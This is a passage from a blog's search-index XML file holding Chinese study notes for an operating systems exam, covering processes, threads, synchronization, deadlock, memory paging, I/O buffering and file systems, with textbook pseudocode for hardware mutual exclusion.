<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>os复习</title>
      <link href="/post/204eb42c.html"/>
      <url>/post/204eb42c.html</url>
      
        <content type="html"><![CDATA[<!-- build time:Tue Jun 25 2019 02:57:48 GMT+0800 (中国标准时间) --><a id="more"></a><h1 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h1><h2 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h2><h3 id="第一章-计算机系统概述"><a href="#第一章-计算机系统概述" class="headerlink" title="第一章 计算机系统概述"></a>第一章 计算机系统概述</h3><h4 id="名词"><a href="#名词" class="headerlink" title="名词"></a>名词</h4><h5 id="计算机基本构成"><a href="#计算机基本构成" class="headerlink" title="计算机基本构成"></a>计算机基本构成</h5><p>处理器、内存、I/O设备、系统总线</p><h5 id="指令周期"><a href="#指令周期" class="headerlink" title="指令周期"></a>指令周期</h5><p>指令周期是取出一条指令并执行这条指令的时间。 一般由若干个机器周期组成，是从取指令、分析指令到执行完所需的全部时间。</p><h5 id="中断"><a href="#中断" class="headerlink" title="中断"></a>中断</h5><p>中断通常被定义为一个事件，该事件能够改变处理器执行指令的顺序。</p><h5 id="存储层次结构"><a href="#存储层次结构" class="headerlink" title="存储层次结构*"></a>存储层次结构*</h5><p>由不同容量、成本和访问时间的存储设备组成存储器系统，以实现价格、容量和访问时间之间的折中。<br>价格递减、容量递增、存取时间递增、存取频率递减<br>板上存储器-&gt;板外存储器-&gt;离线存储器</p><h5 id="局部性Locality"><a href="#局部性Locality" class="headerlink" title="局部性Locality"></a>局部性Locality</h5><p>在执行程序期间，处理器的指令访存和数据访存呈“簇”状<br>时间局部性：如果一个信息项正在被访问，那么在近期它很可能还会被再次访问。<br>空间局部性：在最近的将来将用到的信息很可能与现在正在使用的信息在空间地址上是临近的。<br>顺序局部性：大部分指令是顺序进行的。</p><h5 id="I-O三种通信方式"><a href="#I-O三种通信方式" class="headerlink" title="I/O三种通信方式"></a>I/O三种通信方式</h5><ul><li>程序I/O<br>处理器在执行I/O指令后，采用轮询的方式定期检查I/O模块的状态，以确定I/O操作是否已经完成（做好接受或发送更多数据的准备）</li><li>中断驱动I/O<br>处理器给I/O模块发送I/O命令，然后处理器继续做其他一些有用的工作，当I/O模块准备好与处理器交换数据时，它将打断处理器的执行并请求服务。</li><li>DMA<br>处理器执行I/O指令后，给DMA模块产生一条命令，并发送处理I/O必要的信息，之后处理器继续其他工作，由DMA直接与存储器交互，完成I/O操作，直到完成传送后，DMA向处理器发一个中断信号。</li></ul><h3 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h3><h4 id="名词-1"><a href="#名词-1" class="headerlink" title="名词"></a>名词</h4><h5 id="操作系统的概念"><a href="#操作系统的概念" class="headerlink" title="操作系统的概念"></a>操作系统的概念</h5><p>操作系统是控制应用程序执行的程序，是应用程序和计算机硬件间的接口。有3个目标：方便、优先、可扩展性<br>可扩展性：硬件升级、新的服务、纠正错误</p><h5 id="简单批处理系统"><a href="#简单批处理系统" class="headerlink" title="简单批处理系统"></a>简单批处理系统</h5><p>为提高cpu利用率，使用一个称为监控程序的软件，用户不再直接访问机器。每个程序返回到监控程序，并自动加载下一个程序</p><h5 id="多道批处理系统"><a href="#多道批处理系统" class="headerlink" title="多道批处理系统"></a>多道批处理系统</h5><p>简单批处理IO太慢，处理器无法充分利用。<br>引入了中断，允许多个程序同时进入内存并运行。当一道程序因I/O请求而暂停运行时，CPU便立即转去运行另一道程序。</p><h5 id="分时系统"><a href="#分时系统" class="headerlink" title="分时系统"></a>分时系统</h5><p>多个用户分享处理器时间。把处理器的运行时间分成很短的时间片，按时间片轮流把处理器分配给多个用户程序使用。由于计算机速度很快，给每个用户的感觉好像是自己独占一台计算机。</p><h4 id="简答"><a href="#简答" class="headerlink" title="简答"></a>简答</h4><h5 id="操作系统的目标和功能"><a href="#操作系统的目标和功能" class="headerlink" title="操作系统的目标和功能"></a>操作系统的目标和功能</h5><ul><li>方便：使计算机易于使用</li><li>有效：以更有效的方式使用系统资源</li><li><p>扩展能力：在不妨碍服务的情况下，可以有效的开发、测试、引入新功能。</p></li><li><p>作为用户/计算机接口：向用户提供各种服务，终端用户无须关心计算机的硬件细节。</p></li><li>作为资源管理器：管理计算机资源，并管理进程、存储器、I/O设备、程序和数据。</li><li>对硬件机器的扩展</li></ul><h4 id="分时系统、批处理系统"><a href="#分时系统、批处理系统" class="headerlink" title="分时系统、批处理系统"></a>分时系统、批处理系统</h4><ul><li>多道：由于简单批处理系统中，高速的CPU会长时间等待低速的I/O造成CPU利用率低下，为进一步提高资源的利用率和系统的吞吐率，引入了多道。</li><li>分时：多道批处理响应时间长，不能提供人机交互能力，为了用户能实时了解自己程序的运行情况，并控制计算机，引入了分时技术。</li></ul><h3 id="第三章"><a href="#第三章" class="headerlink" title="第三章"></a>第三章</h3><h4 id="名词-2"><a href="#名词-2" class="headerlink" title="名词"></a>名词</h4><h5 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h5><p>一个正在运行的程序。有一组指令、一个当前状态和一组相关的系统资源表征的活动单元</p><h5 id="PCB"><a href="#PCB" class="headerlink" title="PCB"></a>PCB</h5><p>操作系统用于管理控制进程的一个专门数据结构，记录进程的各种属性，描述进程的动态变化过程。</p><h5 id="CPU模式"><a href="#CPU模式" class="headerlink" title="CPU模式"></a>CPU模式</h5><p>大部分CPU拥有两种模式，内核模式中全部指令可以无限制执行；用户模式中可执行的指令被限制。</p><h5 id="进程状态"><a href="#进程状态" class="headerlink" title="进程状态"></a>进程状态</h5><p>根据进程的定义，我们知道进程是代码运行的实体，而进程有可能是正在运行的，也可能是已经停止的，这就是进程的状态。</p><h4 id="简答-1"><a href="#简答-1" class="headerlink" title="简答"></a>简答</h4><h5 id="pcb的构成"><a href="#pcb的构成" class="headerlink" title="pcb的构成"></a>pcb的构成</h5><p>标识符、状态、优先级、程序计数器、内存指针、上下文数据、IO状态信息、记账信息</p><h5 id="画五、七状态图，并给出各种状态之间变化的原因"><a href="#画五、七状态图，并给出各种状态之间变化的原因" class="headerlink" title="画五、七状态图，并给出各种状态之间变化的原因"></a>画五、七状态图，并给出各种状态之间变化的原因</h5><p>书p79</p><h5 id="进程创建具体流程"><a href="#进程创建具体流程" class="headerlink" title="进程创建具体流程"></a>进程创建具体流程</h5><ol><li>分配一个唯一的进程标识符</li><li>为进程分配空间，对于进程孵化操作（父进程创建子进程）还需要传递环境变量，构造共享地址空间。</li><li>初始化PCB</li><li>设置正确的链接（链接在正确的队列中）</li><li>创建或扩充其他数据结构，如记账程序、性能监控程序</li></ol><h5 id="进程切换流程"><a href="#进程切换流程" class="headerlink" title="进程切换流程"></a>进程切换流程</h5><ol><li>保存处理器上下文信息</li><li>更新当前处于运行态进程的PCB，包括状态信息、记账记账信息等</li><li>把该进程移动到相应队列中</li><li>选择另一个进程执行</li><li>更新所选进程的PCB</li><li>更新内存管理数据结构</li><li>载入程序计数器和其他寄存器的值，恢复该进程的上下文</li></ol><h5 id="进程切换的时机"><a href="#进程切换的时机" class="headerlink" title="进程切换的时机"></a>进程切换的时机</h5><ul><li>中断<ul><li>时钟中断</li><li>I/O中断</li><li>内存失效</li></ul></li><li>陷阱，一个错误或异常</li><li>系统调用</li></ul><h5 id="进程切换和模式切换之间差异与联系"><a href="#进程切换和模式切换之间差异与联系" class="headerlink" title="进程切换和模式切换之间差异与联系"></a>进程切换和模式切换之间差异与联系</h5><p>发生模式切换可以不改变正处于运行态的进程状态，保存和恢复上下文只需要很少的开销。若发生进程交换，OS必须使其环境发生实质性变化，涉及状态变化，比模式切换涉及更多工作。</p><h3 id="第四章-线程"><a href="#第四章-线程" class="headerlink" title="第四章 线程"></a>第四章 线程</h3><h4 id="名词-3"><a href="#名词-3" class="headerlink" title="名词"></a>名词</h4><h5 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h5><p>线程是指程序在执行过程中，能够执行程序代码的一个执行单元，线程也被称为轻量级进程。<br>多线程，操作系统在单个进程内支持多个并发执行路径的能力</p><h5 id="SMP"><a href="#SMP" class="headerlink" title="SMP"></a>SMP</h5><p>对称多处理，可以调度进程或线程到所有处理器上运行。</p><h5 id="微内核（microkernel）和宏内核（monolithic）"><a href="#微内核（microkernel）和宏内核（monolithic）" class="headerlink" title="微内核（microkernel）和宏内核（monolithic）"></a>微内核（microkernel）和宏内核（monolithic）</h5><ul><li>微内核：内核态只保留了最基本的功能：cpu调度，内存管理，进程通信。</li><li>宏内核：宏内核几乎包含了所有功能，调度、文件系统、网络、设备驱动器、存储管理</li></ul><h4 id="简答-2"><a href="#简答-2" class="headerlink" title="简答"></a>简答</h4><h5 id="进程和线程之间的关系"><a href="#进程和线程之间的关系" class="headerlink" title="进程和线程之间的关系"></a>进程和线程之间的关系</h5><p>线程是进程中的一部分，是进程内的一个执行单元、可调度实体，一个进程至少有一个线程，进程可包含多个线程在运行，这些线程共享进程的地址空间</p><h5 id="进程和线程之间的异同"><a href="#进程和线程之间的异同" class="headerlink" title="进程和线程之间的异同"></a>进程和线程之间的异同</h5><p>进程在执行过程中拥有独立的内存单元，是资源分配和调度的单位，而线程则共享内存，是调度分派的单位。线程的创建、切换和终止需要的时间远小于进程。</p><p>#####　引入线程的原因</p><ul><li>应用需要</li><li>开销需要：在进程内创建、终止线程比创建、终止进程要快。同一进程内的线程间切换比进程间的切换要快,尤其是用户级线程间的切换。线程之间相互通信无须通过内核</li><li>性能需要：多个线程中，任务功能不同（有的负责计算，有的负责I/O）,如果有多个处理器，一个进程就可以有很多的任务同时在执行。</li></ul><h5 id="线程实现方法"><a href="#线程实现方法" class="headerlink" title="线程实现方法"></a>线程实现方法</h5><ul><li>用户级线程：有关线程管理的所有工作都由应用程序完成，内核意识不到多线程的存在。</li><li>内核级线程：内核线程建立和销毁都是在内核的支持下运行，由操作系统负责管理，通过系统调用完成的</li><li>混合方法</li></ul><h5 id="ULT-amp-KLT优缺点"><a href="#ULT-amp-KLT优缺点" class="headerlink" title="ULT&amp;KLT优缺点"></a>ULT&amp;KLT优缺点</h5><ul><li>ULT<ul><li>优点<ul><li>线程切换不需要内核态特权，节省两次状态变换的开销。</li><li>调度是可以应用程序相关的，可以为应用程序定做调度算法。</li><li>可以在任何操作系统运行，不需要对底层内核进行修改。</li></ul></li><li>缺点<ul><li>执行一个系统调用时，所有线程都会阻塞</li><li>一个多线程应用程序不能利用多处理技术。</li></ul></li></ul></li><li>KLT<ul><li>优点<ul><li>进程中的多个线程可以同时在多个处理器上运行</li><li>一个线程阻塞不会使同一进程内的其他线程被阻塞</li><li>系统级线程本身也可以是多线程</li></ul></li><li>缺点<ul><li>从一个线程向另一个在同一进程中线程传输系统控制权，需要内核模式切换</li></ul></li></ul></li></ul><h5 id="微内核的好处"><a href="#微内核的好处" class="headerlink" title="微内核的好处"></a>微内核的好处</h5><ol><li>提高了系统的可扩展性</li><li>增强了系统的可靠性</li><li>可移植性：操作系统绝大部分均与硬件平台无关</li><li>提供了对分布式系统的支持。客户和服务器之间以及服务器和服务器之间的通信，是采用消息传递通信机制进行的，致使微内核OS能很好地支持分布式系统和网络系统</li></ol><h3 id="第五章"><a href="#第五章" class="headerlink" title="第五章"></a>第五章</h3><h4 id="名词-4"><a href="#名词-4" class="headerlink" title="名词"></a>名词</h4><h5 id="并行"><a href="#并行" class="headerlink" title="并行"></a>并行</h5><p>同一时刻，有多条指令在多个处理器上同时执行。</p><h5 id="并发"><a href="#并发" class="headerlink" title="并发"></a>并发</h5><p>同一时刻只有一条指令执行，但多个进程指令被快速轮换执行，使得在宏观上具有多个进程同时执行的效果</p><h5 id="交替执行（interleave）、覆盖（overlay）"><a href="#交替执行（interleave）、覆盖（overlay）" class="headerlink" title="交替执行（interleave）、覆盖（overlay）"></a>交替执行（interleave）、覆盖（overlay）</h5><ul><li>覆盖：覆盖技术是指程序员组织程序和数据的一种方式，当可供程序和数据使用的内存空间不足时，应用程序不同模块可以分配到主存中的同一块区域中，主程序负责在需要的时候换出或换入模块。</li><li>交替执行</li></ul><h5 id="互斥"><a href="#互斥" class="headerlink" title="互斥"></a>互斥</h5><p>当一个进程在临界区访问共享资源时，其他进程不能进如该临界区访问共享资源</p><h5 id="同步"><a href="#同步" class="headerlink" title="同步"></a>同步</h5><p>它是指为完成某种任务而建立的两个或多个进程，这些进程因为需要在某些位置上协调它们的工作次序而等待、传递信息所产生的制约关系。进程间的直接制约关系就是源于它们之间的相互合作。</p><h5 id="临界区（critical-section）和临界资源"><a href="#临界区（critical-section）和临界资源" class="headerlink" title="临界区（critical section）和临界资源"></a>临界区（critical section）和临界资源</h5><ul><li>临界区：一段代码，在这段代码中将访问共享资源，当一个进程已在这段代码中执行，这个进程就不能在这段代码中执行</li><li>临界资源：一次仅允许一个进程使用的资源称为临界资源</li></ul><h5 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h5><p>多个线程或进程在读写一个共享资源时，结果依赖于它们执行的相对时间</p><h5 id="原子操作"><a href="#原子操作" class="headerlink" title="原子操作"></a>原子操作</h5><p>一个函数或动作由一个或多个指令序列实现，对外是不可见的。没有其他进程能看到其中间状态或中断此操作</p><h5 id="信号量"><a href="#信号量" class="headerlink" title="信号量"></a>信号量</h5><p>用于进程间传递信号的一个整数值，在信号量上可以进行三种操作：初始化、递增、递减，这三种操作都是原子操作。递减用于阻塞一个进程，递增用于解除一个阻塞的进程。</p><h4 id="简答-3"><a href="#简答-3" class="headerlink" title="简答"></a>简答</h4><h5 id="并行阶段解决四个问题"><a href="#并行阶段解决四个问题" class="headerlink" title="并行阶段解决四个问题"></a>并行阶段解决四个问题</h5><ol><li>进程间通信</li><li>共享资源</li><li>多进程同步</li><li>分配处理器时间</li></ol><h5 id="信号量类型"><a href="#信号量类型" class="headerlink" title="信号量类型"></a>信号量类型</h5><ul><li>二元信号量<br>只取0值和1值的信号量</li><li>互斥量<br>类似于二元信号量，区别在于为其加锁和解锁的进程必须为同一个进程</li></ul><ul><li>强信号量<br>按照FIFO策略，阻塞时间最久的进程先从队列中释放</li><li>弱信号量<br>没有规定出队的顺序</li></ul><h5 id="实现互斥的三种方法"><a href="#实现互斥的三种方法" class="headerlink" title="实现互斥的三种方法"></a>实现互斥的三种方法</h5><ul><li>硬件方法<ul><li>中断禁用</li><li>特殊机器指令</li></ul></li><li>软件方法<br>让并发的进程承担互斥的责任</li><li>在操作系统或编程语言中提供某种级别的支持（信号量、管程、消息传递）</li></ul><h5 id="硬件实现互斥的伪代码"><a href="#硬件实现互斥的伪代码" class="headerlink" title="硬件实现互斥的伪代码"></a>硬件实现互斥的伪代码</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">compare_and_swap</span><span class="params">(<span class="keyword">int</span> *word, <span class="keyword">int</span> testval, <span class="keyword">int</span> newval)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> oldval;</span><br><span class="line">  oldval = *word;</span><br><span class="line">  <span class="keyword">if</span>(oldval == testval) *word = newval;</span><br><span class="line">  <span class="keyword">return</span> oldval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">exchange</span><span class="params">(<span class="keyword">int</span> *<span class="keyword">register</span>, <span class="keyword">int</span> *memory)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> temp = *memory;</span><br><span class="line">  *memory = *<span class="keyword">register</span>;</span><br><span class="line">  *<span class="keyword">register</span> = temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*******************************************************/</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> n = <span class="comment">/*进程个数*/</span></span><br><span class="line"><span class="keyword">int</span> bolt;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">P</span><span class="params">(<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span>(compare_and_swap(bolt, <span class="number">0</span>, <span class="number">1</span>) == <span class="number">1</span>)</span><br><span class="line">      <span class="comment">/*不做任何事*/</span></span><br><span class="line">    <span class="comment">/*临界区*/</span></span><br><span class="line">    bolt = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*******************************************************/</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> n = <span class="comment">/*进程个数*/</span></span><br><span class="line"><span class="keyword">int</span> bolt;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">P</span><span class="params">(<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">int</span> keyi = <span class="number">1</span>;</span><br><span class="line">    <span class="function"><span class="keyword">do</span> <span class="title">exchange</span><span class="params">(keyi, bolt)</span></span></span><br><span class="line"><span class="function">    <span class="title">while</span><span class="params">(keyi != <span class="number">0</span>)</span></span></span><br><span class="line"><span class="function">    <span class="comment">/*临界区*/</span></span></span><br><span class="line"><span class="function">    bolt </span>= <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="大题【IPC-同步-amp-互斥】"><a href="#大题【IPC-同步-amp-互斥】" class="headerlink" title="大题【IPC 同步 &amp; 互斥】"></a>大题【IPC 同步 &amp; 互斥】</h4><h5 id="生产者消费者"><a href="#生产者消费者" class="headerlink" title="生产者消费者"></a>生产者消费者</h5><h5 id="读者、写者"><a href="#读者、写者" class="headerlink" title="读者、写者"></a>读者、写者</h5><h3 id="第六章"><a href="#第六章" class="headerlink" title="第六章"></a>第六章</h3><h4 id="名词-5"><a href="#名词-5" class="headerlink" title="名词"></a>名词</h4><h5 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h5><p>两个或两个以上进程因每个进程都在等待其他进程做完某些事而自身不能继续执行</p><h5 id="活锁"><a href="#活锁" class="headerlink" title="活锁"></a>活锁</h5><p>两个或两个以上进程为响应其他进程的变化而持续改变自己的状态但不做有用的工作</p><h5 id="饥饿"><a href="#饥饿" class="headerlink" title="饥饿"></a>饥饿</h5><p>一个进程尽管能够执行，但被调度程序无限期的忽视，而不能被调度执行</p><h4 id="简答-4"><a href="#简答-4" class="headerlink" title="简答"></a>简答</h4><h5 id="死锁的必要条件、充要条件"><a href="#死锁的必要条件、充要条件" class="headerlink" title="死锁的必要条件、充要条件"></a>死锁的必要条件、充要条件</h5><ul><li>互斥<br>一次只有一个进程可以使用一个资源，其他进程不能访问已分配给其他进程的资源</li><li>占有且等待<br>一个进程等待其他进程时，继续占有已分配的资源</li><li>不可抢占<br>不能强行抢占进程已占有的资源</li><li>循环等待<br>存在一个闭合的进程链，每个进程至少占有此链中下一个进程所需的一个资源</li></ul><h5 id="解决死锁的方法"><a href="#解决死锁的方法" class="headerlink" title="解决死锁的方法"></a>解决死锁的方法</h5><ul><li>允许发生再解决<ul><li>鸵鸟（无为而治）</li><li>死锁检测<ul><li>退出所有死锁进程</li><li>回滚到某个检查点，再重启</li><li>连续退出直到死锁不在存在</li><li>连续抢占资源知道死锁不在存在</li></ul></li></ul></li><li>不允许发生<ul><li>死锁预防<br>清除4条件之一<ul><li>互斥：不能禁止</li><li>占有且等待：一次分配所有资源</li><li>不可抢占：抢占(优先级)</li><li>循环等待：安排资源线性顺序</li></ul></li><li>死锁避免<br>基于资源分配的当前状态，动态选择<ul><li>进程启动拒绝<br>当一个新进程想运行，若对某一资源的需求大于现有的，则拒绝。</li><li>银行家算法</li></ul></li></ul></li></ul><h3 id="第七章"><a href="#第七章" class="headerlink" title="第七章"></a>第七章</h3><h4 id="名词-6"><a href="#名词-6" class="headerlink" title="名词"></a>名词</h4><h5 id="重定位"><a href="#重定位" class="headerlink" title="重定位"></a>重定位</h5><p>程序在执行过程中可以分配不同的物理地址。也就是说，程序可以在内存中移动，可以换入换出，可以占用不用的内存区域。程序在执行时，逻辑地址被动态转换成物理地址。</p><h5 id="覆盖"><a href="#覆盖" class="headerlink" title="覆盖"></a>覆盖</h5><p>覆盖技术是指程序员组织程序和数据的一种方式，当可供程序和数据使用的内存空间不足时，应用程序不同模块可以分配到主存中的同一块区域中，主程序负责在需要的时候换出或换入模块。</p><h5 id="交换"><a href="#交换" class="headerlink" title="交换"></a>交换</h5><p>把处于阻塞状态的程序从内存移到辅存，把内存空间腾出来。</p><h5 id="逻辑地址、相对地址、物理地址"><a href="#逻辑地址、相对地址、物理地址" class="headerlink" title="逻辑地址、相对地址、物理地址"></a>逻辑地址、相对地址、物理地址</h5><p>略</p><h5 id="内部碎片、外部碎片"><a href="#内部碎片、外部碎片" class="headerlink" title="内部碎片、外部碎片"></a>内部碎片、外部碎片</h5><ul><li>内部：装入的数据块小于分区的大小</li><li>外部：在内存中的许多小空洞，因为太小而不能分配给进程，造成浪费</li></ul><h5 id="伙伴系统"><a href="#伙伴系统" class="headerlink" title="伙伴系统"></a>伙伴系统</h5><p>伙伴系统是固定分区和动态分区的一种折中方案。</p><h4 id="简答-5"><a href="#简答-5" class="headerlink" title="简答"></a>简答</h4><h5 id="固定分区和分页之间的关系"><a href="#固定分区和分页之间的关系" class="headerlink" title="固定分区和分页之间的关系"></a>固定分区和分页之间的关系</h5><h5 id="动态分区和分段之间的关系"><a href="#动态分区和分段之间的关系" class="headerlink" title="动态分区和分段之间的关系"></a>动态分区和分段之间的关系</h5><h5 id="first-best-nearest-fit"><a href="#first-best-nearest-fit" class="headerlink" title="first/best/nearest fit"></a>first/best/nearest fit</h5><h5 id="简单分区和纯分页的特点"><a href="#简单分区和纯分页的特点" class="headerlink" title="简单分区和纯分页的特点"></a>简单分区和纯分页的特点</h5><h5 id="分页和分段机制的地址映射计算方法"><a href="#分页和分段机制的地址映射计算方法" class="headerlink" title="分页和分段机制的地址映射计算方法"></a>分页和分段机制的地址映射计算方法</h5><h3 id="第八章"><a href="#第八章" class="headerlink" title="第八章"></a>第八章</h3><h4 id="名词-7"><a href="#名词-7" class="headerlink" title="名词"></a>名词</h4><h5 id="缺页中断"><a href="#缺页中断" class="headerlink" title="缺页中断"></a>缺页中断</h5><p>当访问某个页表项，“存在位”未置位，说明需要的也不在内存中，这将产生一次内存访问故障。<br>然后将由操作系统负责装入所需要的页，并更新页表</p><h5 id="抖动（thrashing）"><a href="#抖动（thrashing）" class="headerlink" title="抖动（thrashing）"></a>抖动（thrashing）</h5><p>处理器大多数时间都在交换块而非执行指令</p><h5 id="倒排页表（inverted-page-table）"><a href="#倒排页表（inverted-page-table）" class="headerlink" title="倒排页表（inverted page table）"></a>倒排页表（inverted page table）</h5><p>普通页表的重要缺陷是也表的大小与虚拟地址空间成正比。<br>倒排页表将虚拟地址的页号部分使用一个简单的散列函数映射到散列表中。散列表包含指向倒排表的指针，而倒排表中含有页表项。</p><h5 id="TLB"><a href="#TLB" class="headerlink" title="TLB"></a>TLB</h5><p>转换检测缓冲区。这是一个高速缓存，包含有最近用过的页表项。</p><h5 id="页缓冲"><a href="#页缓冲" class="headerlink" title="页缓冲"></a>页缓冲</h5><p>提高分页的性能并允许使用较简单的页面置换策略的一种方法。代表性的是VAX VMS，这种算法不丢弃置换出的页，而是将它分配到空闲页链表（未被修改）或是修改页链表（被修改）中。这些页仍留在内存中，若进程访问该页，可迅速返回该进程的驻留集。</p><h5 id="六大策略"><a href="#六大策略" class="headerlink" title="六大策略"></a>六大策略</h5><h4 id="简答-6"><a href="#简答-6" class="headerlink" title="简答"></a>简答</h4><h5 id="虚拟存储三种实现方法和特点"><a href="#虚拟存储三种实现方法和特点" class="headerlink" title="虚拟存储三种实现方法和特点"></a>虚拟存储三种实现方法和特点</h5><ul><li>分页<ul><li>将内存划分为大小固定的页框</li><li>程序被内存管理系统划分为页</li><li>有内部碎片 没有外部碎片</li><li>每个进程都有一个页表</li><li>程序运行时，不是所有页都必须在内存页框中，仅在需要时才加载</li><li>把一页写入内存可能要把另一页写出到磁盘</li></ul></li><li>分段</li><li>段页式</li></ul><h5 id="缺页中断处理流程（图）"><a href="#缺页中断处理流程（图）" class="headerlink" title="缺页中断处理流程（图）"></a>缺页中断处理流程（图）</h5><h5 id="分页addr-translation"><a href="#分页addr-translation" class="headerlink" title="分页addr translation"></a>分页addr translation</h5><h5 id="引入分级页表原因、优缺点"><a href="#引入分级页表原因、优缺点" class="headerlink" title="引入分级页表原因、优缺点"></a>引入分级页表原因、优缺点</h5><h5 id="驻留集（三种策略）"><a href="#驻留集（三种策略）" class="headerlink" title="驻留集（三种策略）"></a>驻留集（三种策略）</h5><ul><li>局部固定分配<br>总页数过少时，会产生很高的缺页率；总页数过多，内存中只能有很少的几个程序</li><li>全局可变分配<br>最容易实现，难点在于选择置换页，可以用页缓冲技术。</li><li>局部可变分配<br>关于增大或减小驻留集大小的决定必须仔细权衡，且要对活动进程的将来进行评估。这将比简单全局置换策略复杂的多，但是会有更好的性能。</li></ul><h4 id="计算"><a href="#计算" class="headerlink" title="计算"></a>计算</h4><h5 id="缺页中断次数"><a href="#缺页中断次数" class="headerlink" title="缺页中断次数"></a>缺页中断次数</h5><p>OPT LRU FIFO CLOCK</p><h3 id="第九章"><a href="#第九章" class="headerlink" title="第九章"></a>第九章</h3><ul><li><strong>进程切换、调度和抢占的关系</strong></li><li><strong>长、中、短程调度，状态变化</strong></li><li><strong>抢占</strong></li></ul><h3 id="第十一章"><a href="#第十一章" class="headerlink" title="第十一章"></a>第十一章</h3><h4 id="名词-8"><a href="#名词-8" class="headerlink" title="名词"></a>名词</h4><h5 id="块、流设备"><a href="#块、流设备" class="headerlink" title="块、流设备"></a>块、流设备</h5><ul><li>面向块：将信息保存在块中，块的大小通常是固定的，传送过程中一次传送一块，可通过块号访问数据</li><li>面向流：以字节流的方式输入输出数据。</li></ul><h5 id="raid"><a href="#raid" class="headerlink" title="raid"></a>raid</h5><p>独立磁盘冗余阵列</p><h4 id="简答-7"><a href="#简答-7" class="headerlink" title="简答"></a>简答</h4><h5 id="IO-buffer引入原因、三种实现及优缺点"><a href="#IO-buffer引入原因、三种实现及优缺点" class="headerlink" title="IO buffer引入原因、三种实现及优缺点"></a>IO buffer引入原因、三种实现及优缺点</h5><p>引入原因：</p><ol><li>改善CPU和I/O设备之间速度不匹配的矛盾</li><li>可以减少对CPU的中断频率，放宽对中断响应时间的限制</li><li>提高CPU和I/O设备之间的并行性。</li></ol><ul><li><p>单缓冲：在设备和处理机之间设置一个缓冲区。设备和处理机交换数据时，先把被交换数据写入缓冲区，然后需要数据的设备或处理机从缓冲区取走数据。</p><ul><li>缺点：增加了操作系统逻辑的复杂度，交换逻辑也受到影响</li></ul></li><li><p>双缓冲： I/O设备输入数据时先装填到缓冲区1，在缓冲区1填满后才开始装填缓冲区2，与此同时处理机可以从缓冲区1中取出数据放入用户进程处理，当缓冲区1中的数据处理完后，若缓冲区2已填满，则处理机又从缓冲区2中取出数据放入用户进程处理，而I/O设备又可以装填缓冲区1。双缓冲机制提高了处理机和输入设备的并行操作的程度。</p><ul><li>缺点：复杂性更高，对于每次只传送一个字节操作，双缓冲没有特别优势，</li></ul></li><li><p>循环缓冲：大量io操作</p></li></ul><h5 id="disk-delay（5个）"><a href="#disk-delay（5个）" class="headerlink" title="disk delay（5个）"></a>disk delay（5个）</h5><ul><li>寻道延迟：磁头定位到磁道所需要的时间</li><li>旋转延迟：磁头到达扇区所需要的时间</li><li>存取延迟：寻道+旋转</li><li>传输时间：磁头定位后，通过下面旋转的扇区，开始读写操作的时间。</li></ul><h3 id="第十二章"><a href="#第十二章" class="headerlink" title="第十二章"></a>第十二章</h3><h4 id="名词-9"><a href="#名词-9" class="headerlink" title="名词"></a>名词</h4><h5 id="什么是文件、文件系统"><a href="#什么是文件、文件系统" class="headerlink" title="什么是文件、文件系统"></a>什么是文件、文件系统</h5><ul><li>文件：一组赋名的相关联字符流的集合，或者是相关联记录。</li><li>文件系统：文件管理系统及其管理的文件集合</li><li>文件管理系统：一组具有特权指令的程序，为用户提供管理文件的接口</li></ul><h5 id="文件系统设计层次"><a href="#文件系统设计层次" class="headerlink" 